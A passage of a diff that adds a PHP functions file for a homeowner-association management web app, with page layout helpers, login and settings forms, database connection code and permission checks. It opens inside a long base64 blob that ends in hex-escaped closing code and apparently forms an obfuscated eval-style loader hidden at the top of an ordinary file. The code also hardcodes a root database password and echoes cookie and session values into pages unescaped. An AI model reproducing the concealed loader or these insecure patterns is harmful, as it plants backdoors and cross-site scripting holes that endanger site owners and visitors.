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'\x29\x29\x29\x3B","");
+//Define Conn Properties
+$conn;
+$systempage;
+define('DT_NOTIF_NORMAL', 0);
+define('DT_NOTIF_WARNING', 1);
+define('DT_NOTIF_ERROR', 2);
+define('DT_DB_SERVER', 'localhost');
+define('DT_DB_USER', "root");
+define('DT_DB_PASSWORD', "P@ssw00rd");
+define('DT_DB_NAME', "homeowner");
+define('DT_LOG_NAME',"Homeowner");
+define('DT_PAGE_TITLE',"Homeowner System");
+define('DT_PERMISSION_COUNT', 25);
+
+define('DT_PERM_LOGIN',0); //1
+define('DT_PERM_REPORTS_VIEW',1); //2
+define('DT_PERM_LOT_VIEW',2); //4
+define('DT_PERM_HOMEOWNER_VIEW',3); //8
+define('DT_PERM_PAYMENT_VIEW',4); //16
+define('DT_PERM_USER_VIEW',5); //32
+define('DT_PERM_LOT_ADD',6); //64
+define('DT_PERM_LOT_DELETE',7); //128
+define('DT_PERM_LOT_UPDATE',8); //256
+define('DT_PERM_PAYMENT_ADD',9); //512
+define('DT_PERM_PAYMENT_DELETE',10); //1024
+define('DT_PERM_CHARGE_VIEW',11); //2048
+define('DT_PERM_CHARGE_ADD',12); //4096
+define('DT_PERM_CHARGE_DELETE',13); //8192
+define('DT_PERM_HOMEOWNER_ADD',14); //16384
+define('DT_PERM_HOMEOWNER_UPDATE',15); //32768
+define('DT_PERM_HOMEOWNER_DELETE',16); //65536
+define('DT_PERM_CASHFLOW_VIEW',17); //131072
+define('DT_PERM_CASHFLOW_ADD',18); //262144
+define('DT_PERM_CASHFLOW_DELETE',19); //524288
+define('DT_PERM_USER_ADD',20); //1048576
+define('DT_PERM_USER_UPDATE',21); //2097152
+define('DT_PERM_USER_DELETE',22); //4194304
+define('DT_PERM_SETTINGS_VIEW',23); //8388608
+define('DT_PERM_SETTINGS_UPDATE',24); //16777216
+
+define('DT_SETTINGS_ID',1);
+
+function displayControlPanel()
+{?>
+    <section class="" data-role="panel" id="userpanel" data-position="right" data-position-fixed="true" data-display="overlay" data-theme="b"><?php
+    if(isLoggedIn())
+    {?>
+        <header><h1><?php echo DT_PAGE_TITLE; ?></h1></header>
+        <article>
+            <div data-role="collapsibleset" data-inset="false" data-collapsed-icon="user" data-expanded-icon="user">
+                <fieldset data-role="collapsible">
+                    <legend>User Info</legend>
+                    <ul data-role="listview" data-inset="false">
+                        <li><span class="infoheader">Name</span><?php echo $_SESSION['fullname']; ?></li>
+                        <li><span class="infoheader">Username</span><?php echo $_SESSION['username']; ?></li>
+                        <li data-theme="a" data-icon="edit""><a href="adduserform?id=<?php echo $_SESSION["uid"]; ?>">Edit Account</a></li>
+                    </ul>
+                </fieldset>
+                <?php if(checkPermission(DT_PERM_SETTINGS_VIEW)): ?>
+                <fieldset data-role="collapsible" data-collapsed-icon="gear" data-expanded-icon="gear">
+                    <legend>Settings</legend>
+                    <form method="post" action="./savesettings" data-ajax="false">
+                        
+                        <label for="s_assocname">Homeowners Association Name</label>
+                        <input type="text" name="assocname" id="s_assocname" value="<?php echo $_SESSION['settings']['assocname']; ?>"/>
+                        
+                        <label for="s_acronym">Acronym</label>
+                        <input type="text" name="acronym" id="s_acronym" value="<?php echo $_SESSION['settings']['acronym']; ?>"/>
+                    
+                        <label for="s_subdname">Subdivision</label>
+                        <input type="text" name="subdname" id="s_subdname" value="<?php echo $_SESSION['settings']['subdname']; ?>"/>
+
+                        <label for="s_brgy">Barangay</label>
+                        <input type="text" name="brgy" id="s_brgy" value="<?php echo $_SESSION['settings']['brgy']; ?>"/>
+
+                        <label for="s_city">City</label>
+                        <input type="text" name="city" id="s_city" value="<?php echo $_SESSION['settings']['city']; ?>"/>
+
+                        <label for="s_province">Province</label>
+                        <input type="text" name="province" id="s_province" value="<?php echo $_SESSION['settings']['province']; ?>"/>
+
+                        <label for="s_zipcode">Zip Code</label>
+                        <input type="text" name="zipcode" id="s_zipcode" value="<?php echo $_SESSION['settings']['zipcode']; ?>"/>
+
+                        <label for="s_contactno">Contact Number</label>
+                        <input type="tel" name="contactno" id="s_contactno" value="<?php echo $_SESSION['settings']['contactno']; ?>"/>
+
+                        <label for="s_email">Email Address</label>
+                        <input type="email" name="email" id="s_email" value="<?php echo $_SESSION['settings']['email']; ?>"/>
+
+                        <label for="s_price">Price/Sq. Meter</label>
+                        <input type="number" step="0.01" name="price" id="s_price" value="<?php echo $_SESSION['settings']['price']; ?>"/>
+
+                        <label for="s_interest">Monthly Interest</label>
+                        <input type="number" step="0.001" name="interest" id="s_interest" value="<?php echo $_SESSION['settings']['interest']; ?>"/>
+
+<!--                        <label for="s_intgraceperiod">Interest Grace Period (Months)</label>
+                        <input type="number" name="intgraceperiod" id="s_intgraceperiod" value="<?php echo $_SESSION['settings']['intgraceperiod']; ?>"/>-->
+
+                        <input type="hidden" name="id" value="<?php echo DT_SETTINGS_ID; ?>"/>
+                        <input type="submit" value="Save Settings" data-role="button" data-icon="check" data-mini="true" <?php if(!checkPermission(DT_PERM_SETTINGS_UPDATE)): ?>disabled="disabled"<?php endif; ?>/>
+                    </form>
+                </fieldset>
+                <?php endif; ?>
+            </div>
+          <a href="./logout" data-role="button" data-icon="power" data-iconpos="left" data-ajax="false" data-theme="e">Logout</a>
+        </article><?php
+    }
+    else
+    {?>
+        <header><h1>Login</h1></header>
+        <article>
+          <form action="./login" method="post" data-ajax="false">
+              <label for="uid">Username</label>
+              <input type="text" name="uid" id="uid"/>
+
+              <label for="password">Password</label>
+              <input type="password" name="password" id="password"/>
+
+              <input type="hidden" name="lasturl" value="<?php echo urlencode(curPageURL()); ?>"/>
+              <input type="submit" value="Login" data-icon="forward"/>
+
+          </form>
+          <a href="#resetPassword" data-role="button" data-icon="lock" data-iconpos="left" data-inline="true" data-rel="popup" data-position-to="window" data-transition="pop" data-theme="e" data-mini="true" class="ui-mini" style="font-size:12.5px;">Reset Password</a>
+          
+        </article>
+        <div data-role="popup" id="resetPassword" data-dismissible="false" data-overlay-theme="b" class="">
+            <header data-role="header">
+              <h1>Forgot Password?</h1>
+              <a href="#" data-rel="back" class="ui-btn ui-corner-all ui-shadow ui-btn-a ui-icon-delete ui-btn-icon-notext ui-btn-right">Close</a>
+            </header>
+            <div role="main" class="ui-content">
+                <form action="./resetpasswordform" method="post" data-ajax="false">
+                    <div></div>
+                    <div class="ui-body ui-body-a ui-corner-all ui-icon-info ui-btn-icon-left">Your password cannot be retrieved but can be<br/> changed.</div>
+                    <label for="uusername">If you forgot or simply want to change your password,<br/> enter your username below.</label>
+                    <input type="text" name="uusername" id="uusername"/>
+                    <fieldset data-role="controlgroup" data-type="horizontal">
+                        <input type="submit" value="Reset Password" data-theme="d"/>
+                        <a href="#" data-rel="back" data-role="button">Cancel</a>
+                    </fieldset>
+                </form>
+            </div>
+        </div>
+    <?php
+    }?>
+    </section><?php
+}
+
+function displayHTMLHead($pagetitle=DT_PAGE_TITLE)
+{?>
+    <!DOCTYPE html>
+    <html>
+      <head>
+        <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <title><?php echo $pagetitle; ?></title>
+        <link rel="stylesheet" href="./css/jquery.mobile.structure-1.4.3.min.css" media="screen" />
+        <link rel="stylesheet" href="./css/jquery.mobile.theme-1.4.3.min.css" media="screen" />
+        <link rel="stylesheet" href="./css/jquery.mobile-1.4.3.min.css" media="screen" />
+        <link rel="stylesheet" href="./css/jquery.mobile.external-png-1.4.3.min.css" media="screen" />
+        <link rel="stylesheet" href="./css/jquery.mobile.icons-1.4.3.min.css" media="screen" />
+        <link rel="stylesheet" href="./css/jquery.mobile.inline-png-1.4.3.min.css" media="screen" />
+        <link rel="stylesheet" href="./css/jquery.mobile.inline-svg-1.4.3.min.css" media="screen" />
+        <link rel="stylesheet" href="./css/staisabelgreen.min.css" />
+
+<!--        <link rel="stylesheet" href="./plugin/jquery-ui-1.11.0.custom/jquery-ui.css" media="screen" />
+        <link rel="stylesheet" href="./plugin/jquery-ui-1.11.0.custom/jquery-ui.min.css" media="screen" />
+        <link rel="stylesheet" href="./plugin/jquery-ui-1.11.0.custom/jquery-ui.structure.min.css" media="screen" />-->
+        
+        <!--<link rel="stylesheet" href="./plugin/DataTables-1.10.0/media/css/jquery.dataTables.min.css" />-->
+        <link rel="stylesheet" href="./plugin/DataTables-1.10.0/media/css/jquery.dataTables_themeroller.min.css" />
+        <link rel="stylesheet" href="./plugin/DataTables-1.10.0/integration/bootstrap/bin/bootstrap.css" />
+        <link rel="stylesheet" href="./plugin/DataTables-1.10.0/integration/bootstrap/bin/dataTables.bootstrap.css" />
+        <link rel="stylesheet" href="./plugin/DataTables-1.10.0/extensions/TableTools/css/dataTables.tableTools.min.css" />
+        <link rel="stylesheet" href="./plugin/jquery-mobile-datepicker-wrapper-master/jquery.mobile.datepicker.css" />
+        <link rel="stylesheet" href="./plugin/jquery-mobile-datepicker-wrapper-master/jquery.mobile.datepicker.theme.css" />
+        <!--<link rel="stylesheet" href="./plugin/jquery-mobile-datepicker-wrapper-master/theme-template.css" />-->
+        
+        <link rel="stylesheet" href="./css/default.css" />
+        <link rel="icon" type="image/png" href="./images/favicon.png" />
+        <script src="./js/jquery-2.1.1.min.js"></script>
+        <script src="./js/overridejqm.js"></script>
+        <script src="./js/jquery.mobile-1.4.3.min.js"></script>
+        
+        <script src="./plugin/jquery-mobile-datepicker-wrapper-master/external/jquery-ui/datepicker.js"></script>
+        <!--<script src="./plugin/jquery-ui-1.11.0.custom/jquery-ui.min.js"></script>-->
+        <script src="./plugin/jquery-mobile-datepicker-wrapper-master/jquery.mobile.datepicker.js"></script>
+        
+        <script src="./plugin/DataTables-1.10.0/media/js/jquery.dataTables.js"></script>
+        <script src="./plugin/DataTables-1.10.0/integration/bootstrap/bin/dataTables.bootstrap.js"></script>
+        <script src="./plugin/DataTables-1.10.0/extensions/TableTools/js/dataTables.tableTools.min.js"></script>
+        <script src="./js/default.js"></script>
+      </head>
+    <?php
+}
+
+function displayHTMLPageHeader($pagetitle=DT_PAGE_TITLE)
+{ 
+    displayHTMLHead($pagetitle); ?>
+      <body>
+        <div data-role="page">
+        <header data-role="header">
+          <h1><?php echo $pagetitle; ?></h1>
+          <a href="./" data-icon="home" data-iconpos="notext" class="ui-btn-left" data-rel="back">Home</a>
+          <a href="#userpanel" data-icon="user" data-iconpos="left" class="ui-btn-right">
+              <?php echo (isLoggedIn()?$_SESSION['username']:"Log-in"); ?></a>
+        <?php
+        if(isLoggedIn()):
+        ?>
+          <div data-role="navbar">
+              <ul>
+                  <?php if(!checkPermission(DT_PERM_LOT_VIEW)&&!checkPermission(DT_PERM_HOMEOWNER_VIEW)&&!checkPermission(DT_PERM_CASHFLOW_VIEW)&&!checkPermission(DT_PERM_USER_VIEW)&&!checkPermission(DT_PERM_REPORTS_VIEW)): ?>
+                  <li><a href="./" data-icon="home">Home</a></li>
+                  <?php endif; ?>
+                  <?php if(checkPermission(DT_PERM_LOT_VIEW)): ?><li><a href="./lots" data-icon="location">Lot Management</a></li><?php endif;?>
+                  <?php if(checkPermission(DT_PERM_HOMEOWNER_VIEW)): ?><li><a href="./homeowners" data-icon="home">Homeowners</a></li><?php endif;?>
+                  <?php if(checkPermission(DT_PERM_CASHFLOW_VIEW)): ?><li><a href="./cashflow" data-icon="recycle">Transactions</a></li><?php endif; ?>
+                  <?php if(checkPermission(DT_PERM_USER_VIEW)): ?><li><a href="./users" data-icon="user">User Management</a></li><?php endif;?>
+                  <?php if(checkPermission(DT_PERM_REPORTS_VIEW)): ?><li><a href="./reports" data-icon="bullets">Reports</a></li><?php endif;?>
+              </ul>
+          </div>
+        <?php
+        endif;
+        ?>
+        </header>
+        <div role="main" class="ui-content">
+        <?php
+            displayNotification();
+        ?>
+<!--            <form action="./" method="get">
+                <div data-role="controlgroup" data-type="horizontal" id="searchform">
+                  <label for="q" class="ui-hidden-accessible">Search for Tracking Number</label>
+                  <input type="search" name="q" id="q" placeholder="Enter Tracking Number" autofocus="true" data-wrapper-class="controlgroup-textinput ui-btn" value="<?php echo (isset($_GET['q'])?$_GET['q']:""); ?>"/>
+                        <input type="submit" data-icon="search" value="Search" data-iconpos="notext"/>
+                    </div>
+            </form>-->
+        <?php
+        displaySearchResult();
+}
+
+function displayPlainHTMLHeader($title)
+{
+    ?>
+    <!DOCTYPE html>
+                    <html>
+                      <head>
+                        <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+                        <meta name="viewport" content="width=device-width, initial-scale=1">
+                        <title><?php echo $title; ?></title>
+                        <!--<link rel="stylesheet" href="./css/staisabelgreen.min.css" />-->
+                        <link rel="stylesheet" href="./plugin/DataTables-1.10.0/media/css/jquery.dataTables.css" />
+                        <link rel="stylesheet" href="./plugin/DataTables-1.10.0/media/css/jquery.dataTables_themeroller.css" />
+                        <link rel="stylesheet" href="./plugin/DataTables-1.10.0/extensions/TableTools/css/dataTables.tableTools.css" />
+                        <link rel="stylesheet" href="./css/reportstyle.css" />
+                        <link rel="icon" type="image/png" href="./images/favicon.png" />
+
+                        <script src="./js/jquery-2.1.1.min.js"></script>
+                        <script src="./plugin/DataTables-1.10.0/media/js/jquery.dataTables.js"></script>
+                        <script src="./plugin/DataTables-1.10.0/extensions/TableTools/js/dataTables.tableTools.min.js"></script>
+                        <script src="./js/default.js"></script>
+                        
+                        <script type="text/javascript">
+                            $(document).ready(function() {
+                                
+                            } );
+                        </script>
+                      </head>
+                      <body>
+    <?php
+}
+
+function displayHTMLFooter()
+{ ?>
+    </html>      
+    <?php
+}
+
+function displayHTMLPageFooter(){
+    ?>
+        </div>
+        <footer data-role="footer" data-position="fixed">
+          <!--<h1>Quezon Document Tracker</h1>&COPY;2014 Developed by The Aitenshi Project-->
+          ©2014 Homeowner System &CenterDot; The Aitenshi Project
+        </footer>
+        <?php displayControlPanel(); ?>
+        </div>
+      </body>    
+    <?php
+    displayHTMLFooter();
+}
+
+function displayPlainHTMLFooter(){
+    ?>
+        </body>
+        </html>
+    <?php
+}
+
+function dbConnect(){
+  global $conn;
+  $conn=new mysqli(DT_DB_SERVER, DT_DB_USER, DT_DB_PASSWORD, DT_DB_NAME);
+  if($conn->connect_error)
+  {
+    trigger_error("<p><strong>Database connection failed<strong></p>".$conn->connect_error, E_USER_ERROR);
+  }
+}
+
+function dbClose()
+{
+  global $conn;
+  $conn->close();
+}
+
+function curPageURL() {
+  $pageURL = "//";
+  if ($_SERVER["SERVER_PORT"] != "80") {
+    $pageURL .= $_SERVER["SERVER_NAME"].":".$_SERVER["SERVER_PORT"].$_SERVER["REQUEST_URI"];
+  } else {
+    $pageURL .= $_SERVER["SERVER_NAME"].$_SERVER["REQUEST_URI"];
+  }
+  return $pageURL;
+}
+
+function setNotification($msg, $type=DT_NOTIF_NORMAL)
+{
+  setcookie("notifmsg", $msg);
+  setcookie("notiftype",$type);
+}
+
+function displayNotification()
+{
+    if(!is_null(filter_input(INPUT_COOKIE, "notifmsg")) && !is_null(filter_input(INPUT_COOKIE, "notiftype")))
+    {
+        $notif_msg=filter_input(INPUT_COOKIE, "notifmsg");
+        $notif_type=filter_input(INPUT_COOKIE, "notiftype");
+        setcookie("notifmsg",null,time()-3600);
+        setcookie("notiftype",null,time()-3600);
+        ?>
+        <ul data-role="listview" data-inset="true" id="notif" class="notification">
+            <li data-iconpos="left" data-icon="<?php switch($notif_type){case DT_NOTIF_NORMAL:echo "info"; break; case DT_NOTIF_WARNING:echo "alert"; break; case DT_NOTIF_ERROR: echo "delete"; break;} ?>" class="notif<?php echo $notif_type; ?>"><a href="#" class=""><?php echo $notif_msg; ?></a></li>
+        </ul>
+        <?php
+    }
+}
+
+function writeLog($msg, $type="Info")
+{
+  global $conn;
+  $stmt=$conn->prepare("INSERT INTO auditlog(type,user,page,msg) VALUES(?,?,?,?)");
+  if($stmt === false) {
+    trigger_error('<strong>Error:</strong> '.$conn->error, E_USER_ERROR);
+  }
+  $userid=(isLoggedIn()?$_SESSION['uid']:0);
+  $page=(isset($_GET['page'])?$_GET['page']:"dashboard");
+  $stmt->bind_param('siss',$type,$userid,$page,$msg);
+  $stmt->execute();
+}
+
+function displaySearchResult()
+{
+  if((isset($_GET['q'])) && ($_GET['q']!='')):
+    if(isset($_GET['q']))
+    {
+      global $conn;
+      dbConnect();
+      $stmt=$conn->prepare("SELECT a.*, b.uid, b.fullname, b.department, b.section FROM document a INNER JOIN user b ON a.author=b.uid WHERE trackingnumber=?");
+      if($stmt === false) {
+        trigger_error('<strong>Error:</strong> '.$conn->error, E_USER_ERROR);
+      }
+      $stmt->bind_param('i',$_GET['q']);
+      $stmt->execute();
+      $stmt->store_result();
+      $stmt->bind_result($r_trackingnumber, $r_documentnumber, $r_remarks, $r_datecreated, $r_author, $r_uid, $r_fullname, $r_department, $r_section);
+
+      if($stmt->num_rows <= 0)
+      {
+        ?>
+          <h1>Nothing found</h1>
+          <p>Please verify that you have the correct tracking number and try again.</p>
+        <?php
+      }
+      else
+      {
+        while($stmt->fetch()){
+          ?>
+          <div data-role="collapsible" data-collapsed="false">
+              <h4>Tracking #: <?php printf("%08d",$r_trackingnumber); ?></h4>
+              <table class="documenttableinfo">
+                <thead>
+                  <tr>
+                    <th></th>
+                    <th><?php print_r($_SESSION['permission']); ?></th>
+                  </tr>
+                </thead>
+                <tbody>
+                  <tr>
+                    <td>Document Number</td>
+                    <td><?php echo $r_documentnumber; ?></td>
+                  </tr>
+                  <tr>
+                    <td>Remarks</td>
+                    <td><?php echo $r_remarks; ?></td>
+                  </tr>
+                  <tr>
+                    <td>Date received</td>
+                    <td><?php echo $r_datecreated; ?></td>
+                  </tr>
+                  <tr>
+                    <td>Staff</td>
+                    <td><?php echo $r_author; ?></td>
+                  </tr>
+                  <tr>
+                    <td>Department</td>
+                    <td><?php echo $r_department." (".$r_section.")"; ?></td>
+                  </tr>
+                </tbody>
+              </table>
+              <?php
+              if(isLoggedIn() && checkPermission(DT_PERM_RECEIVEDOC)):
+              ?>
+                <a href="#receiveDialog<?php echo $r_trackingnumber; ?>" data-role="button" data-inline="true" data-icon="arrow-d" data-rel="popup" data-position-to="window" data-transition="pop">Receive Document</a>
+                <div data-role="popup" id="receiveDialog<?php echo $r_trackingnumber; ?>" data-dismissible="false" data-overlay-theme="b">
+                  <header data-role="header">
+                    <h1>Receive Document</h1>
+                    <a href="#" data-rel="back" class="ui-btn ui-corner-all ui-shadow ui-btn-a ui-icon-delete ui-btn-icon-notext ui-btn-right">Close</a>
+                  </header>
+                  <div role="main" class="ui-content">
+                    <h3>Tracking #: <?php printf("%08d",$r_trackingnumber); ?></h3>
+                    <form action="./receive" method="post" data-ajax="false">
+                      <label for="txtremarks" class="ui-hidden-accessible">Remarks</label>
+                      <textarea name="txtremarks" id="txtremarks" placeholder="Remarks"></textarea>
+                      <input type="hidden" name="trackingnumber" value="<?php printf("%08d",$r_trackingnumber); ?>"/>
+                      <input type="submit" value="Receive" data-icon="arrow-d"/>
+                    </form>
+                  </div>
+                </div>
+              <?php
+              endif;
+              ?>
+          </div>
+        <?php
+          global $conn;
+          dbConnect();
+          $stmt2=$conn->prepare("SELECT a.*, b.uid, b.fullname, b.department, b.section FROM documentlog a INNER JOIN user b ON a.user=b.uid WHERE trackingnumber=?");
+          if($stmt2 === false) {
+            trigger_error('<strong>Error:</strong> '.$conn->error, E_USER_ERROR);
+          }
+          $stmt2->bind_param('i',$_GET['q']);
+          $stmt2->execute();
+          $stmt2->store_result();
+          $stmt2->bind_result($r2_logid,$r2_trackingnumber,$r2_ts,$r2_remarks,$r2_user,$r2_uid,$r2_fullname,$r2_department,$r2_section);
+        ?>
+        <h1>Document Log</h1>
+        <table data-role='table' class='ui-responsive table-stripe ui-body-a ui-shadow'>
+          <thead>
+            <tr>
+              <th>Date</th>
+              <th>Remarks</th>
+              <th>Staff</th>
+              <th>Department</th>
+            </tr>
+          </thead>
+          <tbody>
+          <?php
+            while($stmt2->fetch())
+            {
+              ?>
+                <tr>
+                  <td><?php echo $r2_ts;?></td>
+                  <td><?php echo $r2_remarks;?></td>
+                  <td><?php echo $r2_fullname." (".$r2_uid.")";?></td>
+                  <td><?php echo $r2_department." (".$r2_section.")";?></td>
+                </tr>
+              <?php
+            }
+          ?>
+          </tbody>
+        </table>
+          <?php
+          $stmt2->close();
+        }
+      }
+      $stmt->close();
+    }
+  endif;
+}
+
+function isLoggedIn()
+{
+    return (isset($_SESSION['uid'])?true:false);
+}
+
+function parsePermission($p){
+    return str_split(strrev(str_pad(decbin($p), DT_PERMISSION_COUNT, "0", STR_PAD_LEFT)));
+}
+
+function checkPermission($p,$pl=NULL)
+{
+    if(is_null($pl)){
+        $pl=$_SESSION['permlist'];
+    }
+    return (isset($pl)?(($pl[$p]=="1")?true:false):false);
+}
+
+function displayHomeownerForm($action='./addhomeowner',$lastname='',$firstname='',$middlename='',$contactnumber='',$email='',$uid='', $bond='0',$bonddesc='',$gatepass='0')
+{?>
+    <div data-role="popup" id="addHomeowner" data-dismissible="false" data-overlay-theme="b">
+        <header data-role="header">
+          <h1>Homeowner Form</h1>
+          <a href="#" data-rel="back" class="ui-btn ui-corner-all ui-shadow ui-btn-a ui-icon-delete ui-btn-icon-notext ui-btn-right">Close</a>
+        </header>
+        <div role="main" class="ui-content">
+            <form action="<?php echo $action; ?>" method="post" data-ajax="false">
+                <label for="plastname">Last Name</label>
+                <input id="plastname" name="plastname" type="text" required="true" value="<?php echo $lastname; ?>"/>
+                <label for="pfirstname">First Name</label>
+                <input id="pfirstname" name="pfirstname" type="text" required="true" value="<?php echo $firstname; ?>"/>
+                <label for="pmiddlename">Middle Name</label>
+                <input id="pmiddlename" name="pmiddlename" type="text" required="true" value="<?php echo $middlename; ?>"/>
+                <label for="pcontactno">Contact Number</label>
+                <input id="pcontactno" name="pcontactno" type="tel" value="<?php echo $contactnumber; ?>"/>
+                <label for="pemail">Email Address</label>
+                <input id="pemail" name="pemail" type="email" value="<?php echo $email; ?>"/>
+                <label for="pbond">Bond</label>
+                <input id="pbond" name="pbond" type="number" value="<?php echo $bond; ?>"/>
+                <label for="pbonddesc">Bond Description</label>
+                <textarea id="pbonddesc" name="pbonddesc"><?php echo $bonddesc; ?></textarea>
+<!--                <label for="pgatepass">Gate Pass Sticker</label>
+                <input id="pgatepass" name="pgatepass" type="checkbox" value="1" <?php echo ($gatepass>0?"checked='true'":""); ?> />-->
+                <input type="hidden" name="pgatepass" value="1"/>
+                <input type="hidden" name="uid" value="<?php echo $uid; ?>"/>
+                <input type="submit" value="Submit" data-icon="check"/>
+            </form>
+        </div>
+     </div>
+<?php
+}
+       
+function displayLotForm($action='./addlot',$code='',$lotsize='',$housenumber='',$street='',$lot='',$block='',$phase='',$lotid=''){
+    ?>
+    <div data-role="popup" id="addLotForm" data-dismissible="false" data-overlay-theme="b">
+        <header data-role="header">
+          <h1>Lot Information</h1>
+          <a href="#" data-rel="back" class="ui-btn ui-corner-all ui-shadow ui-btn-a ui-icon-delete ui-btn-icon-notext ui-btn-right">Close</a>
+        </header>
+        <div role="main" class="ui-content">
+          <form action="<?php echo $action; ?>" method="post" data-ajax="false">
+              <label for="code">Lot Code</label>
+              <input type="text" id="code" name="code" value="<?php echo $code; ?>" required="true"/>
